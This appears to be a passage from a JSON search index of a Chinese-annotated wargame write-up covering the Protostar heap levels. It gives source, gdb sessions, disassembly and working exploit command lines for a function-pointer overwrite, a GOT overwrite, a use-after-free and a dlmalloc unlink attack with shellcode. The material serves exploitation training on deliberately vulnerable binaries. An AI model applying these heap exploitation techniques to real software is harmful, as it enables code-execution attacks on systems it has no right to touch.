0x696d6461 0x00000a6e 0x804c010: 0x00000000 0x00000ff1 0x00000000 0x00000000 0x804c020: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c030: 0x00000000 0x00000000 0x00000000 0x00000000 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $17 = { name = \"admin\\n\\000\\000\\000\\000\\000\\000\\361\\017\" , '\\000' <repeats 17 times>, auth = 0 } --------service---------------------------------- $18 = 0x0 ------------------------------------------------- [ auth = 0x804c008, service = ( nil ) ] service AAAAAAAAAAAAAAAAAAAAAAAAAAA Breakpoint 1 , 0x0804895f in main ( argc = 1 , argv = 0xbffff754 ) at heap2/heap2.c:20 20 in heap2/heap2.c ------------------------------------------------- 0x804c000: 0x00000000 0x00000011 0x696d6461 0x00000a6e 0x804c010: 0x00000000 0x00000029 0x41414120 0x41414141 0x804c020: 0x41414141 0x41414141 0x41414141 0x41414141 0x804c030: 0x41414141 0x0000000a 0x00000000 0x00000fc9 0x804c040: 0x00000000 0x00000000 0x00000000 0x00000000 --------auth------------------------------------- $19 = { name = \"admin\\n\\000\\000\\000\\000\\000\\000)\\000\\000\\000 \" , 'A' <repeats 15 times>, auth = 1094795585 } --------service---------------------------------- $20 = 0x804c018 \" \" , 'A' <repeats 27 times>, \"\\n\" ------------------------------------------------- [ auth = 0x804c008, service = 0x804c018 ] login you have logged in already! Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # use after free $ ./heap2 [ auth = ( nil ) , service = ( nil ) ] auth admin [ auth = 0x804c008, service = ( nil ) ] reset [ auth = 0x804c008, service = ( nil ) ] service AAA [ auth = 0x804c008, service = 0x804c008 ] service BBB [ auth = 0x804c008, service = 0x804c018 ] service CCC [ auth = 0x804c008, service = 0x804c028 ] login you have logged in already! 1 2 3 4 5 6 7 8 9 # simple overwrite $ ./heap2 [ auth = ( nil ) , service = ( nil ) ] auth admin [ auth = 0x804c008, service = ( nil ) ] service AAAAAAAAAAAAAAAAAAAAAAA [ auth = 0x804c008, service = 0x804c018 ] login you have logged in already! Heap 3 \u00b6 the Doug Lea Malloc (dlmalloc) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/types.h> #include <stdio.h> void winner () { printf ( \"that wasn't too bad now, was it? @ %d \\n \" , time ( NULL )); } int main ( int argc , char ** argv ) { char * a , * b , * c ; a = malloc ( 32 ); b = malloc ( 32 ); c = malloc ( 32 ); strcpy ( a , argv [ 1 ]); // can't deal with null bytes strcpy ( b , argv [ 2 ]); strcpy ( c , argv [ 3 ]); free ( c ); free ( b ); free ( a ); printf ( \"dynamite failed? \\n \" ); } \u901a\u8fc7 malloc \u7684 unlink \u4fee\u6539 GOT \u8868\u6761\u76ee\uff0c FD->bk \u5bf9\u5e94\u76ee\u6807 GOT \u8868\u6761\u76ee\u5730\u5740\uff0c BK \u6307\u5411 shellcode \u7684\u8d77\u59cb\u5730\u5740 \u6ce8\u610f\u6709 BK->fd \u5199\u56de 1 2 3 4 5 6 #define unlink(P, BK, FD) { FD = P -> fd ; BK = P -> bk ; FD -> bk = BK ; BK -> fd = FD ; } Overflow b \u4fee\u6539 c \u5bf9\u5e94 chunk \u7684\u5927\u5c0f\u4f7f\u5176\u5927\u4e8e MAX_FAST_SIZE 80 \uff0cOverflow c \u6765\u6784\u9020 fake chunk \u63a7\u5236 unlink \uff0c\u7528\u4e8e\u8c03\u7528\u51fd\u6570 winner \u7684 shellcode \u53ef\u653e\u4e8e a \u4e2d fake chunk \u7684 prev_inuse \u4f4d\u9700\u8bbe\u7f6e\u4e3a 0 \u6ce8\u610f free \u4f1a\u4fee\u6539 chunk \u7684 forward pointer\uff0c\u5373 data \u57df\u7684\u9996 \\(4\\) \u5b57\u8282 prev_size size fd bk fake chunk \u7684 next chunk \u7684 prev_inuse \u4f4d\u540c\u6837\u5e94\u4e3a 0\uff0c\u4ece\u800c\u80fd\u8c03\u7528 unlink 1 2 3 4 5 6 7 nextinuse = inuse_bit_at_offset ( nextchunk , nextsize ); if ( ! nextinuse ) { unlink ( nextchunk , bck , fwd ); size += nextsize ; } else clear_inuse_bit_at_offset ( nextchunk , 0 ); next chunk \u7684\u8d77\u59cb\u5730\u5740\u6839\u636e\u5f53\u524d chunk \u7684\u8d77\u59cb\u5730\u5740\u548c size \u8fdb\u884c\u8ba1\u7b97\uff0c\u53ef\u4ee5\u8bbe\u7f6e size \u4e3a 0xfffffffc \uff0c\u5b9e\u9645\u8ba1\u7b97\u7b49\u540c\u4e8e -4\uff0c\u907f\u514d\u4e86 null \u5b57\u8282\u4e5f\u65e0\u9700\u518d\u6784\u9020\u4e00\u4e2a chunk \u67e5\u770b\u76f8\u5173\u5730\u5740\u4fe1\u606f Dump of assembler code for function main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x08048889 <main+0>: push ebp 0x0804888a <main+1>: mov ebp,esp 0x0804888c <main+3>: and esp,0xfffffff0 0x0804888f <main+6>: sub esp,0x20 0x08048892 <main+9>: mov DWORD PTR [ esp ] ,0x20 0x08048899 <main+16>: call 0x8048ff2 <malloc> 0x0804889e <main+21>: mov DWORD PTR [ esp+0x14 ] ,eax 0x080488a2 <main+25>: mov DWORD PTR [ esp ] ,0x20 0x080488a9 <main+32>: call 0x8048ff2 <malloc> 0x080488ae <main+37>: mov DWORD PTR [ esp+0x18 ] ,eax 0x080488b2 <main+41>: mov DWORD PTR [ esp ] ,0x20 0x080488b9 <main+48>: call 0x8048ff2 <malloc> 0x080488be <main+53>: mov DWORD PTR [ esp+0x1c ] ,eax 0x080488c2 <main+57>: mov eax,DWORD PTR [ ebp+0xc ] 0x080488c5 <main+60>: add eax,0x4 0x080488c8 <main+63>: mov eax,DWORD PTR [ eax ] 0x080488ca <main+65>: mov DWORD PTR [ esp+0x4 ] ,eax 0x080488ce <main+69>: mov eax,DWORD PTR [ esp+0x14 ] 0x080488d2 <main+73>: mov DWORD PTR [ esp ] ,eax 0x080488d5 <main+76>: call 0x8048750 <strcpy@plt> 0x080488da <main+81>: mov eax,DWORD PTR [ ebp+0xc ] 0x080488dd <main+84>: add eax,0x8 0x080488e0 <main+87>: mov eax,DWORD PTR [ eax ] 0x080488e2 <main+89>: mov DWORD PTR [ esp+0x4 ] ,eax 0x080488e6 <main+93>: mov eax,DWORD PTR [ esp+0x18 ] 0x080488ea <main+97>: mov DWORD PTR [ esp ] ,eax 0x080488ed <main+100>: call 0x8048750 <strcpy@plt> 0x080488f2 <main+105>: mov eax,DWORD PTR [ ebp+0xc ] 0x080488f5 <main+108>: add eax,0xc 0x080488f8 <main+111>: mov eax,DWORD PTR [ eax ] 0x080488fa <main+113>: mov DWORD PTR [ esp+0x4 ] ,eax 0x080488fe <main+117>: mov eax,DWORD PTR [ esp+0x1c ] 0x08048902 <main+121>: mov DWORD PTR [ esp ] ,eax 0x08048905 <main+124>: call 0x8048750 <strcpy@plt> 0x0804890a <main+129>: mov eax,DWORD PTR [ esp+0x1c ] 0x0804890e <main+133>: mov DWORD PTR [ esp ] ,eax 0x08048911 <main+136>: call 0x8049824 <free> 0x08048916 <main+141>: mov eax,DWORD PTR [ esp+0x18 ] 0x0804891a <main+145>: mov DWORD PTR [ esp ] ,eax 0x0804891d <main+148>: call 0x8049824 <free> 0x08048922 <main+153>: mov eax,DWORD PTR [ esp+0x14 ] 0x08048926 <main+157>: mov DWORD PTR [ esp ] ,eax 0x08048929 <main+160>: call 0x8049824 <free> 0x0804892e <main+165>: mov DWORD PTR [ esp ] ,0x804ac27 0x08048935 <main+172>: call 0x8048790 <puts@plt> 0x0804893a <main+177>: leave 0x0804893b <main+178>: ret End of assembler dump. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 ( gdb ) x winner 0x8048864 <winner>: 0x83e58955 ( gdb ) disassemble 0x8048790 Dump of assembler code for function puts@plt: 0x08048790 <puts@plt+0>: jmp DWORD PTR ds:0x804b128 0x08048796 <puts@plt+6>: push 0x68 0x0804879b <puts@plt+11>: jmp 0x80486b0 End of assembler dump. ( gdb ) x 0x804b128 0x804b128 <_GLOBAL_OFFSET_TABLE_+64>: 0x08048796 ( gdb ) info proc map process 17219 cmdline = '/opt/protostar/bin/heap3' cwd = '/opt/protostar/bin' exe = '/opt/protostar/bin/heap3' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x804b000 0x3000 0 /opt/protostar/bin/heap3 0x804b000 0x804c000 0x1000 0x3000 /opt/protostar/bin/heap3 0x804c000 0x804d000 0x1000 0 [ heap ] 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [ vdso ] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [ stack ] \u901a\u8fc7 Online x86 / x64 Assembler and Disassembler \u5c06\u8c03\u7528\u51fd\u6570 winner \u7684\u6c47\u7f16\u8f6c\u6362\u4e3a shellcode 1 2 3 4 # move the address of winner() into eax and call mov eax, 0x8048864 call eax # \\xB8\\x64\\x88\\x04\\x08\\xFF\\xD0 Exploit \u00b6 1 2 3 $ ./heap3 ` echo -ne \"AAAA\\xB8\\x64\\x88\\x04\\x08\\xFF\\xD0\" ` ` python -c \"print('B' * 36 + '\\x65')\" ` ` python -c \"print('C' * 92 + '\\xfc\\xff\\xff\\xff' * 2 + '\\x1c\\xb1\\x04\\x08\\x0c\\xc0\\x04\\x08')\" ` that wasn ' t too bad now, was it? @ 1662354454 Segmentation fault","title":"Heap"},{"location":"wargames/protostar/heap/#heap-0","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include <stdlib.h> #include <unistd.h> #include <string.h> #include <stdio.h> #include <sys/types.h> struct data { char name [ 64 ]; }; struct fp { int ( * fp )(); }; void winner () { printf ( \"level passed \\n \" ); } void nowinner () { printf ( \"level has not been passed \\n \" ); } int main ( int argc , char ** argv ) { struct data * d ; struct fp * f ; d = malloc ( sizeof ( struct data )); // 64 bytes f = malloc ( sizeof ( struct fp )); // 4 bytes f -> fp = nowinner ; printf ( \"data is at %p, fp is at %p \\n \" , d , f ); strcpy ( d -> name , argv [ 1 ]); f -> fp (); } \u9700\u8981\u4fee\u6539 f->fp \u7684\u503c\uff0c\u4f7f\u5176\u6307\u5411 winner \u51fd\u6570 \u67e5\u770b d->name \u6ea2\u51fa\u540e\u5bf9 f->fp \u7684\u5f71\u54cd 1 2 3 4 s = '' for i in range ( 0x41 , 0x5b ): s += chr ( i ) * 4 print s 1 2 3 4 5 6 7 8 $ gdb ./heap0 ( gdb ) r ` python /tmp/heap.py ` Starting program: /opt/protostar/bin/heap0 ` python /tmp/heap.py ` data is at 0x804a008, fp is at 0x804a050 Program received signal SIGSEGV, Segmentation fault. 0x53535353 in ?? () # S winner \u51fd\u6570\u7684\u5730\u5740 1 2 ( gdb ) x winner 0x8048464 <winner>: 0x83e58955","title":"Heap 0"},{"location":"wargames/protostar/heap/#exploit","text":"1 2 3 $ ./heap0 $( python -c \"print 'A' * 72 + '\\x64\\x84\\x04\\x08'\" ) data is at 0x804a008, fp is at 0x804a050 level passed","title":"Exploit"},{"location":"wargames/protostar/heap/#heap-1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include <stdlib.h> #include <unistd.h> #include <string.h> #include <stdio.h> #include <sys/types.h> struct internet { int priority ; char * name ; }; void winner () { printf ( \"and we have a winner @ %d \\n \" , time ( NULL )); } int main ( int argc , char ** argv ) { struct internet * i1 , * i2 , * i3 ; // i1 points to the start of 8 bytes in memory i1 = malloc ( sizeof ( struct internet )); i1 -> priority = 1 ; i1 -> name = malloc ( 8 ); // i1 + 4 i2 = malloc ( sizeof ( struct internet )); i2 -> priority = 2 ; i2 -> name = malloc ( 8 ); strcpy ( i1 -> name , argv [ 1 ]); // \u8d85\u8fc7 8 \u5b57\u8282\u5c06\u4f1a\u5f71\u54cd i2 \u5bf9\u5e94\u7684\u5185\u5b58 strcpy ( i2 -> name , argv [ 2 ]); printf ( \"and that's a wrap folks! \\n \" ); } \u67e5\u770b i1->name \u6ea2\u51fa\u5bf9 i2->name \u7684\u5f71\u54cd \u53ef\u4ee5\u6539\u53d8 i2->name \u7684\u503c\uff0c\u4ece\u800c\u80fd\u901a\u8fc7 strcpy \u5199\u5165\u4efb\u610f\u5730\u5740 1 2 3 4 5 6 7 8 9 $ gdb ./heap1 ( gdb ) r AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444 Starting program: /opt/protostar/bin/heap1 AAAABBBBCCCCDDDDEEEEFFFFGGGG 00001111222233334444 Program received signal SIGSEGV, Segmentation fault. *__GI_strcpy ( dest = 0x46464646 <Address 0x46464646 out of bounds>, # F src = 0xbffff8a1 \"00001111222233334444\" ) at strcpy.c:40 40 strcpy.c: No such file or directory. in strcpy.c \u6ce8\u610f\u5230\u6700\u540e\u8c03\u7528\u4e86 printf \u51fd\u6570\uff0c\u53ef\u4ee5\u8986\u76d6\u5176 GOT \u8868\u6761\u76ee 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x080484b9 <main+0>: push ebp 0x080484ba <main+1>: mov ebp,esp 0x080484bc <main+3>: and esp,0xfffffff0 0x080484bf <main+6>: sub esp,0x20 0x080484c2 <main+9>: mov DWORD PTR [ esp ] ,0x8 0x080484c9 <main+16>: call 0x80483bc <malloc@plt> 0x080484ce <main+21>: mov DWORD PTR [ esp+0x14 ] ,eax 0x080484d2 <main+25>: mov eax,DWORD PTR [ esp+0x14 ] 0x080484d6 <main+29>: mov DWORD PTR [ eax ] ,0x1 0x080484dc <main+35>: mov DWORD PTR [ esp ] ,0x8 0x080484e3 <main+42>: call 0x80483bc <malloc@plt> 0x080484e8 <main+47>: mov edx,eax 0x080484ea <main+49>: mov eax,DWORD PTR [ esp+0x14 ] 0x080484ee <main+53>: mov DWORD PTR [ eax+0x4 ] ,edx 0x080484f1 <main+56>: mov DWORD PTR [ esp ] ,0x8 0x080484f8 <main+63>: call 0x80483bc <malloc@plt> 0x080484fd <main+68>: mov DWORD PTR [ esp+0x18 ] ,eax 0x08048501 <main+72>: mov eax,DWORD PTR [ esp+0x18 ] 0x08048505 <main+76>: mov DWORD PTR [ eax ] ,0x2 0x0804850b <main+82>: mov DWORD PTR [ esp ] ,0x8 0x08048512 <main+89>: call 0x80483bc <malloc@plt> 0x08048517 <main+94>: mov edx,eax 0x08048519 <main+96>: mov eax,DWORD PTR [ esp+0x18 ] 0x0804851d <main+100>: mov DWORD PTR [ eax+0x4 ] ,edx 0x08048520 <main+103>: mov eax,DWORD PTR [ ebp+0xc ] 0x08048523 <main+106>: add eax,0x4 0x08048526 <main+109>: mov eax,DWORD PTR [ eax ] 0x08048528 <main+111>: mov edx,eax 0x0804852a <main+113>: mov eax,DWORD PTR [ esp+0x14 ] 0x0804852e <main+117>: mov eax,DWORD PTR [ eax+0x4 ] 0x08048531 <main+120>: mov DWORD PTR [ esp+0x4 ] ,edx 0x08048535 <main+124>: mov DWORD PTR [ esp ] ,eax 0x08048538 <main+127>: call 0x804838c <strcpy@plt> 0x0804853d <main+132>: mov eax,DWORD PTR [ ebp+0xc ] 0x08048540 <main+135>: add eax,0x8 0x08048543 <main+138>: mov eax,DWORD PTR [ eax ] 0x08048545 <main+140>: mov edx,eax 0x08048547 <main+142>: mov eax,DWORD PTR [ esp+0x18 ] 0x0804854b <main+146>: mov eax,DWORD PTR [ eax+0x4 ] 0x0804854e <main+149>: mov DWORD PTR [ esp+0x4 ] ,edx 0x08048552 <main+153>: mov DWORD PTR [ esp ] ,eax 0x08048555 <main+156>: call 0x804838c <strcpy@plt> 0x0804855a <main+161>: mov DWORD PTR [ esp ] ,0x804864b 0x08048561 <main+168>: call 0x80483cc <puts@plt> # \u7531\u4e8e\u7f16\u8bd1\u4f18\u5316\uff0c\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f puts 0x08048566 <main+173>: leave 0x08048567 <main+174>: ret End of assembler dump. ( gdb ) disassemble 0x80483cc Dump of assembler code for function puts@plt: 0x080483cc <puts@plt+0>: jmp DWORD PTR ds:0x8049774 0x080483d2 <puts@plt+6>: push 0x30 0x080483d7 <puts@plt+11>: jmp 0x804835c End of assembler dump. ( gdb ) x 0x8049774 0x8049774 <_GLOBAL_OFFSET_TABLE_+36>: 0x080483d2 winner \u51fd\u6570\u7684\u5730\u5740 1 2 ( gdb ) x winner 0x8048494 <winner>: 0x83e58955","title":"Heap 1"},{"location":"wargames/protostar/heap/#exploit_1","text":"1 2 3 4 5 6 7 $ ./heap1 ` python -c \"print 'A' * 20 + '\\x74\\x97\\x04\\x08'\" ` ` python -c \"print '\\x94\\x84\\x04\\x08'\" ` and we have a winner @ 1662252909 $ ./heap1 \"`echo -ne \" AAAABBBBCCCCDDDDEEEE \\x 74 \\x 97 \\x 04 \\x 08 \"`\" \"`echo -ne \" \\x 94 \\x 84 \\x 04 \\x 08 \"`\" and we have a winner @ 1662253600 $ ./heap1 \"`/bin/echo -ne \" AAAABBBBCCCCDDDDEEEE \\x 74 \\x 97 \\x 04 \\x 08 \"`\" \"`/bin/echo -ne \" \\x 94 \\x 84 \\x 04 \\x 08 \"`\" and we have a winner @ 1662256772 # \u5728 gdb \u4e2d\u9700\u8981\u4f7f\u7528 /bin/echo\uff0c\u4f7f\u7528 echo \u5c06\u4e0d\u89e3\u6790\u53c2\u6570 -ne \u800c\u662f\u76f4\u63a5\u8f93\u51fa","title":"Exploit"},{"location":"wargames/protostar/heap/#additional","text":"\u5173\u4e8e\u5728 gdb \u4e2d\u4f7f\u7528 echo \u4e0d\u80fd\u6210\u529f\u7684\u95ee\u9898 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $ gdb ./heap1 ( gdb ) break *0x080484ce Breakpoint 1 at 0x80484ce: file heap1/heap1.c, line 23 . ( gdb ) break *0x0804853d Breakpoint 2 at 0x804853d: file heap1/heap1.c, line 32 . ( gdb ) r \"`echo -ne \" AAAABBBBCCCCDDDDEEEE \\x 74 \\x 97 \\x 04 \\x 08 \"`\" \"`echo -ne \" \\x 94 \\x 84 \\x 04 \\x 08 \"`\" Starting program: /opt/protostar/bin/heap1 \"`echo -ne \" AAAABBBBCCCCDDDDEEEE \\x 74 \\x 97 \\x 04 \\x 08 \"`\" \"`echo -ne \" \\x 94 \\x 84 \\x 04 \\x 08 \"`\" Breakpoint 1 , 0x080484ce in main ( argc = 3 , argv = 0xbffff714 ) at heap1/heap1.c:23 23 in heap1/heap1.c ( gdb ) info registers eax 0x804a008 134520840 ecx 0xb7fd93a0 -1208118368 edx 0x804a000 134520832 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff640 0xbffff640 ebp 0xbffff668 0xbffff668 esi 0x0 0 edi 0x0 0 eip 0x80484ce 0x80484ce <main+21> eflags 0x200246 [ PF ZF IF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 ( gdb ) set $i1 = ( struct internet* ) 0x804a008 ( gdb ) print * $i1 $1 = { priority = 0 , name = 0x0 } ( gdb ) c Continuing. Breakpoint 2 , main ( argc = 3 , argv = 0xbffff714 ) at heap1/heap1.c:32 32 in heap1/heap1.c ( gdb ) print * $i1 $2 = { priority = 1 , name = 0x804a018 \"-ne AAAABBBBCCCCDDDDEEEE\\\\x74\\\\x97\\\\x04\\\\x08\" }","title":"Additional"},{"location":"wargames/protostar/heap/#heap-2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/types.h> #include <stdio.h> struct auth { char name [ 32 ]; int auth ; }; struct auth * auth ; char * service ; int main ( int argc , char ** argv ) { char line [ 128 ]; while ( 1 ) { printf ( \"[ auth = %p, service = %p ] \\n \" , auth , service ); if ( fgets ( line , sizeof ( line ), stdin ) == NULL ) break ; if ( strncmp ( line , \"auth \" , 5 ) == 0 ) { auth = malloc ( sizeof ( auth )); memset ( auth , 0 , sizeof ( auth )); // new allocated area can have old data if ( strlen ( line + 5 ) < 31 ) { strcpy ( auth -> name , line + 5 ); } } if ( strncmp ( line , \"reset\" , 5 ) == 0 ) { free ( auth ); } if ( strncmp ( line , \"service\" , 6 ) == 0 ) { service = strdup ( line + 7 ); // strdup(s) returns a pointer to a new string which is a duplicate of the string s. Memory for the new string is obtained with malloc. } if ( strncmp ( line , \"login\" , 5 ) == 0 ) { if ( auth -> auth ) { // use after free printf ( \"you have logged in already! \\n \" ); } else { printf ( \"please enter your password \\n \" ); } } } } \u4f7f\u7528\u6d4b\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ ./heap2 [ auth = ( nil ) , service = ( nil ) ] auth admin [ auth = 0x804c008, service = ( nil ) ] login please enter your password [ auth = 0x804c008, service = ( nil ) ] reset [ auth = 0x804c008, service = ( nil ) ] login please enter your password [ auth = 0x804c008, service = ( nil ) ] service hack [ auth = 0x804c008, service = 0x804c008 ] # auth was freed and service got that free space there \u4f7f\u7528 gdb \u67e5\u770b\u5806\u7684\u4f7f\u7528\u60c5\u51b5 Dump of assembler code for function main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 ( gdb ) set disassembly-flavor intel ( gdb ) disassemble main Dump of assembler code for function main: 0x08048934 <main+0>: push ebp 0x08048935 <main+1>: mov ebp,esp 0x08048937 <main+3>: and esp,0xfffffff0 0x0804893a <main+6>: sub esp,0x90 0x08048940 <main+12>: jmp 0x8048943 <main+15> 0x08048942 <main+14>: nop 0x08048943 <main+15>: mov ecx,DWORD PTR ds:0x804b5f8 0x08048949 <main+21>: mov edx,DWORD PTR ds:0x804b5f4 0x0804894f <main+27>: mov eax,0x804ad70 0x08048954 <main+32>: mov DWORD PTR [ esp+0x8 ] ,ecx 0x08048958 <main+36>: mov DWORD PTR [ esp+0x4 ] ,edx 0x0804895c <main+40>: mov DWORD PTR [ esp ] ,eax 0x0804895f <main+43>: call 0x804881c <printf@plt> 0x08048964 <main+48>: mov eax,ds:0x804b164 0x08048969 <main+53>: mov DWORD PTR [ esp+0x8 ] ,eax 0x0804896d <main+57>: mov DWORD PTR [ esp+0x4 ] ,0x80 0x08048975 <main+65>: lea eax, [ esp+0x10 ] 0x08048979 <main+69>: mov DWORD PTR [ esp ] ,eax 0x0804897c <main+72>: call 0x80487ac <fgets@plt> 0x08048981 <main+77>: test eax,eax 0x08048983 <main+79>: jne 0x8048987 <main+83> 0x08048985 <main+81>: leave 0x08048986 <main+82>: ret 0x08048987 <main+83>: mov DWORD PTR [ esp+0x8 ] ,0x5 0x0804898f <main+91>: mov DWORD PTR [ esp+0x4 ] ,0x804ad8d 0x08048997 <main+99>: lea eax, [ esp+0x10 ] 0x0804899b <main+103>: mov DWORD PTR [ esp ] ,eax 0x0804899e <main+106>: call 0x804884c <strncmp@plt> 0x080489a3 <main+111>: test eax,eax 0x080489a5 <main+113>: jne 0x8048a01 <main+205> 0x080489a7 <main+115>: mov DWORD PTR [ esp ] ,0x4 0x080489ae <main+122>: call 0x804916a <malloc> 0x080489b3 <main+127>: mov ds:0x804b5f4,eax 0x080489b8 <main+132>: mov eax,ds:0x804b5f4 0x080489bd <main+137>: mov DWORD PTR [ esp+0x8 ] ,0x4 0x080489c5 <main+145>: mov DWORD PTR [ esp+0x4 ] ,0x0 0x080489cd <main+153>: mov DWORD PTR [ esp ] ,eax 0x080489d0 <main+156>: call 0x80487bc <memset@plt> 0x080489d5 <main+161>: lea eax, [ esp+0x10 ] 0x080489d9 <main+165>: add eax,0x5 0x080489dc <main+168>: mov DWORD PTR [ esp ] ,eax 0x080489df <main+171>: call 0x80487fc <strlen@plt> 0x080489e4 <main+176>: cmp eax,0x1e 0x080489e7 <main+179>: ja 0x8048a01 <main+205> 0x080489e9 <main+181>: lea eax, [ esp+0x10 ] 0x080489ed <main+185>: lea edx, [ eax+0x5 ] 0x080489f0 <main+188>: mov eax,ds:0x804b5f4 0x080489f5 <main+193>: mov DWORD PTR [ esp+0x4 ] ,edx 0x080489f9 <main+197>: mov DWORD PTR [ esp ] ,eax 0x080489fc <main+200>: call 0x804880c <strcpy@plt> 0x08048a01 <main+205>: mov DWORD PTR [ esp+0x8 ] ,0x5 0x08048a09 <main+213>: mov DWORD PTR [ esp+0x4 ] ,0x804ad93 0x08048a11 <main+221>: lea eax, [ esp+0x10 ] 0x08048a15 <main+225>: mov DWORD PTR [ esp ] ,eax 0x08048a18 <main+228>: call 0x804884c <strncmp@plt> 0x08048a1d <main+233>: test eax,eax 0x08048a1f <main+235>: jne 0x8048a2e <main+250> 0x08048a21 <main+237>: mov eax,ds:0x804b5f4 0x08048a26 <main+242>: mov DWORD PTR [ esp ] ,eax 0x08048a29 <main+245>: call 0x804999c <free> 0x08048a2e <main+250>: mov DWORD PTR [ esp+0x8 ] ,0x6 0x08048a36 <main+258>: mov DWORD PTR [ esp+0x4 ] ,0x804ad99 0x08048a3e <main+266>: lea eax, [ esp+0x10 ] 0x08048a42 <main+270>: mov DWORD PTR [ esp ] ,eax 0x08048a45 <main+273>: call 0x804884c <strncmp@plt> 0x08048a4a <main+278>: test eax,eax 0x08048a4c <main+280>: jne 0x8048a62 <main+302> 0x08048a4e <main+282>: lea eax, [ esp+0x10 ] 0x08048a52 <main+286>: add eax,0x7 0x08048a55 <main+289>: mov DWORD PTR [ esp ] ,eax 0x08048a58 <main+292>: call 0x804886c <strdup@plt> 0x08048a5d <main+297>: mov ds:0x804b5f8,eax 0x08048a62 <main+302>: mov DWORD PTR [ esp+0x8 ] ,0x5 0x08048a6a <main+310>: mov DWORD PTR [ esp+0x4 ] ,0x804ada1 0x08048a72 <main+318>: lea eax, [ esp+0x10 ] 0x08048a76 <main+322>: mov DWORD PTR [ esp ] ,eax 0x08048a79 <main+325>: call 0x804884c <strncmp@plt> 0x08048a7e <main+330>: test eax,eax 0x08048a80 <main+332>: jne 0x8048942 <main+14> 0x08048a86 <main+338>: mov eax,ds:0x804b5f4 0x08048a8b <main+343>: mov eax,DWORD PTR [ eax+0x20 ] 0x08048a8e <main+346>: test eax,eax 0x08048a90 <main+348>: je 0x8048aa3 <main+367> 0x08048a92 <main+350>: mov DWORD PTR [ esp ] ,0x804ada7 0x08048a99 <main+357>: call 0x804883c <puts@plt> 0x08048a9e <main+362>: jmp 0x8048943 <main+15> 0x08048aa3 <main+367>: mov DWORD PTR [ esp ] ,0x804adc3 0x08048aaa <main+374>: call 0x804883c <puts@plt> 0x08048aaf <main+379>: jmp 0x8048943 <main+15> End of assembler dump. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 ( gdb ) r Starting program: /opt/protostar/bin/heap2 [ auth = ( nil ) , service = ( nil ) ] auth admin [ auth = 0x804c008, service = ( nil ) ] ^C Program received signal SIGINT, Interrupt. 0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82 82 ../sysdeps/unix/syscall-template.S: No such file or directory. in ../sysdeps/unix/syscall-template.S Current language: auto The current source language is \"auto; currently asm\" . ( gdb ) info proc mappings process 7281 cmdline = '/opt/protostar/bin/heap2' cwd = '/opt/protostar/bin' exe = '/opt/protostar/bin/heap2' Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x804b000 0x3000 0 /opt/protostar/bin/heap2 0x804b000 0x804c000 0x1000 0x3000 /opt/protostar/bin/heap2 0x804c000 0x804d000 0x1000 0 [ heap ] 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 